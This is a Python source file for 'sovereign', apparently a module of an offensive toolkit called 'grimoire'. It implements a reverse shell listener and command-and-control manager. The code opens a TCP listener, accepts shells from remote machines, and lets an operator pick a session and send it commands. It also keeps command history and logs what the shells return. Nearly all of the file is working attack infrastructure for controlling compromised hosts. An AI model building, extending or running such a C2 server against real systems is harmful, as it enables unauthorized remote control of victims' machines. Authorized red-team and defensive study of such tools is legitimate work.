# sovereign — reverse shell listener and C2 manager
import socket, threading, os, sys, select, json, hashlib, time
from datetime import datetime
from pathlib import Path
from ..utils import C, section, uid

DATA_DIR = Path.home() / ".grimoire" / "sessions"

BANNER = f"""
{C.RED}{C.BOLD}  ╔══════════════════════════════════════════════╗
  ║  S O V E R E I G N  v2.1  —  C2 Manager     ║
  ║  Developer: Light (Neok1ra)                  ║
  ╚══════════════════════════════════════════════╝{C.RESET}
  {C.DIM}Reverse Shell Listener · Sessions · History · Logs{C.RESET}
"""

_sessions      = {}
_sessions_lock = threading.Lock()


class ShellSession(threading.Thread):
    """Handles one reverse shell connection."""

    def __init__(self, conn, addr, sid):
        super().__init__(daemon=True)
        self.conn    = conn
        self.addr    = addr
        self.sid     = sid
        self.running = True
        self.buf     = []
        self.history = []           # command history for this session
        self.name    = f"shell-{sid}"
        self.log_file= DATA_DIR / f"{sid}.log"
        self.read_idx = 0
        DATA_DIR.mkdir(parents=True, exist_ok=True)

    def _log(self, line: str):
        ts = datetime.now().strftime("%H:%M:%S")
        entry = f"[{ts}] {line}\n"
        self.buf.append(entry)
        try:
            with open(self.log_file, "a") as f:
                f.write(entry)
        except Exception:
            pass

    def run(self):
        from ..core.oplog import log
        log(f"Shell connected [{self.sid}]: {self.addr[0]}:{self.addr[1]}", "sovereign")
        self._log(f"SESSION OPEN — {self.addr[0]}:{self.addr[1]}")
        with _sessions_lock:
            _sessions[self.sid]["status"] = "ACTIVE"
        while self.running:
            try:
                rlist, _, _ = select.select([self.conn], [], [], 1.0)
                if rlist:
                    data = self.conn.recv(4096)
                    if not data: break
                    decoded = data.decode(errors="replace")
                    self._log(f"RECV: {decoded.strip()}")
            except Exception:
                break
        self.running = False
        with _sessions_lock:
            if self.sid in _sessions:
                _sessions[self.sid]["status"] = "DEAD"
        self._log("SESSION CLOSED")
        log(f"Shell disconnected [{self.sid}]", "sovereign")

    def send(self, cmd: str) -> bool:
        try:
            self.conn.sendall((cmd + "\n").encode())
            self.history.append({"ts": datetime.now().strftime("%H:%M:%S"), "cmd": cmd})
            self._log(f"SEND: {cmd}")
            return True
        except Exception:
            return False

    def get_output(self, timeout: float = 0.5) -> str:
        time.sleep(timeout)
        with _sessions_lock:
            new_entries = self.buf[self.read_idx:]
            self.read_idx = len(self.buf)
        lines = [b for b in new_entries if "RECV:" in b]
        return "\n".join(l.split("RECV: ", 1)[-1].rstrip('\r\n') for l in lines)


class Listener(threading.Thread):
    def __init__(self, host, port):
        super().__init__(daemon=True)
        self.host = host; self.port = port
        self.running = True; self.sock = None

    def run(self):
        from ..core.oplog import log
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(10)
            self.sock.settimeout(1.0)
            log(f"Listener: {self.host}:{self.port}", "sovereign")
            print(f"\n  {C.GREEN}[*] Listening on {self.host}:{self.port} ...{C.RESET}\n")
            while self.running:
                try:
                    conn, addr = self.sock.accept()
                    sid     = uid(f"{addr}{conn}")[:4].upper()
                    handler = ShellSession(conn, addr, sid)
                    with _sessions_lock:
                        _sessions[sid] = {
                            "id":      sid,
                            "ip":      addr[0],
                            "port":    addr[1],
                            "handler": handler,
                            "status":  "CONNECTED",
                            "opened":  datetime.now().strftime("%H:%M:%S"),
                            "name":    f"shell-{sid}",
                        }
                    handler.start()
                    print(f"  {C.GREEN}[+] NEW SESSION [{sid}] — {addr[0]}:{addr[1]}{C.RESET}")
                except socket.timeout:
                    continue
        except Exception as e:
            print(f"  {C.YELLOW}[!] Listener: {e}{C.RESET}")
        finally:
            if self.sock: self.sock.close()

    def stop(self): self.running = False


_active_listener = None


def _list_sessions():
    with _sessions_lock:
        if not _sessions:
            print(f"  {C.DIM}[No sessions]{C.RESET}"); return
        print(f"\n  {C.RED}{'SID':<6} {'NAME':<16} {'IP':<18} {'PORT':<7} {'STATUS':<10} {'OPENED'}{C.RESET}")
        print(f"  {'─'*65}")
        for sid, s in _sessions.items():
            st = s.get("status","?")
            sc = C.GREEN if st=="ACTIVE" else (C.YELLOW if st=="CONNECTED" else C.DIM)
            print(f"  {C.CYAN}{sid:<6}{C.RESET} {s['name']:<16} {s['ip']:<18} {s['port']:<7} "
                  f"{sc}{st:<10}{C.RESET} {s['opened']}")
    print()

def _show_history(sid: str):
    with _sessions_lock: s = _sessions.get(sid)
    if not s: print(f"  {C.YELLOW}[!] Not found{C.RESET}"); return
    h = s["handler"].history
    if not h:
        print(f"  {C.DIM}[No command history]{C.RESET}"); return
    section(f"HISTORY [{sid}]")
    for i, e in enumerate(h, 1):
        print(f"  {C.DIM}{i:>3} [{e['ts']}]{C.RESET} {e['cmd']}")
    print()

def _interact(sid: str):
    with _sessions_lock: session = _sessions.get(sid)
    if not session:
        print(f"  {C.YELLOW}[!] Session not found{C.RESET}"); return
    h = session["handler"]
    if not h.running:
        print(f"  {C.YELLOW}[!] Session dead{C.RESET}"); return
    print(f"  {C.GREEN}[*] Interacting with [{sid}] — {session['ip']}{C.RESET}")
    print(f"  {C.DIM}Commands logged to: {h.log_file}{C.RESET}")
    print(f"  {C.DIM}'background' to detach  |  'history' to show cmd history  |  'kill' to terminate{C.RESET}\n")
    while True:
        try:
            cmd = input(f"  {C.RED}shell[{sid}]>{C.RESET} ")
        except (EOFError, KeyboardInterrupt):
            print("\n  [Backgrounded]"); break
        if cmd.strip() == "background":
            print("  [Backgrounded]"); break
        elif cmd.strip() == "history":
            _show_history(sid)
        elif cmd.strip() == "kill":
            h.running = False
            try: h.conn.close()
            except: pass
            print(f"  {C.YELLOW}[-] Killed {sid}{C.RESET}"); break
        elif cmd.strip() == "clear":
            os.system("clear")
        else:
            if not h.send(cmd):
                print(f"  {C.YELLOW}[!] Send failed — session may be dead{C.RESET}"); break
            time.sleep(0.4)
            out = h.get_output(0.2)
            if out:
                for line in out.splitlines()[-40:]:
                    print(f"  {line}")


def _interactive():
    global _active_listener
    print(BANNER)
    print(f"  {C.DIM}Commands: listen <port> [host] | sessions | interact <sid> | history <sid> | rename <sid> <name> | kill <sid> | stop | exit{C.RESET}\n")
    while True:
        try:
            raw = input(f"  {C.RED}sovereign>{C.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  [Closing Sovereign]"); break
        if not raw: continue
        parts = raw.split()
        cmd   = parts[0].lower()
        if cmd in ("exit","quit","q"): break
        elif cmd == "listen" and len(parts) >= 2:
            try:
                port  = int(parts[1])
                lhost = parts[2] if len(parts) >= 3 else "0.0.0.0"
                if _active_listener and _active_listener.running:
                    print(f"  {C.YELLOW}[!] Already listening. Run 'stop' first.{C.RESET}"); continue
                _active_listener = Listener(lhost, port)
                _active_listener.start()
            except ValueError:
                print(f"  {C.YELLOW}[!] Invalid port{C.RESET}")
        elif cmd in ("sessions","list"): _list_sessions()
        elif cmd == "interact" and len(parts) >= 2: _interact(parts[1].upper())
        elif cmd == "history"  and len(parts) >= 2: _show_history(parts[1].upper())
        elif cmd == "rename"   and len(parts) >= 3:
            sid = parts[1].upper()
            with _sessions_lock:
                if sid in _sessions:
                    _sessions[sid]["name"]    = parts[2]
                    _sessions[sid]["handler"].name = parts[2]
                    print(f"  {C.GREEN}[+] Renamed {sid} => {parts[2]}{C.RESET}")
        elif cmd == "kill" and len(parts) >= 2:
            sid = parts[1].upper()
            with _sessions_lock: s = _sessions.get(sid)
            if s and s.get("handler"):
                s["handler"].running = False
                try: s["handler"].conn.close()
                except: pass
                print(f"  {C.YELLOW}[-] Killed {sid}{C.RESET}")
        elif cmd == "stop":
            if _active_listener: _active_listener.stop(); print(f"  {C.YELLOW}[-] Listener stopped{C.RESET}")
        else:
            print(f"  {C.DIM}listen | sessions | interact <sid> | history <sid> | rename <sid> <name> | kill | stop{C.RESET}")

def cli_main(args):
    if args and ("--help" in args or "-h" in args):
        print(f"""
  {C.RED}{C.BOLD}SOVEREIGN — C2 Manager{C.RESET}
  {C.DIM}Usage:{C.RESET}
    grimoire sovereign  interactive C2 session manager

  {C.DIM}Commands (inside sovereign):{C.RESET}
    listen <port>         start TCP listener on port
    sessions              list active sessions
    interact <sid>        drop into live shell session
    history <sid>         show command history for session
    rename <sid> <name>   rename a session
    kill <sid>            terminate a session
    stop                  stop the listener
    exit                  quit sovereign

  {C.DIM}Session logs saved to:{C.RESET} ~/.grimoire/sessions/<sid>.log
""")
        return
    _interactive()

def launch(): _interactive()
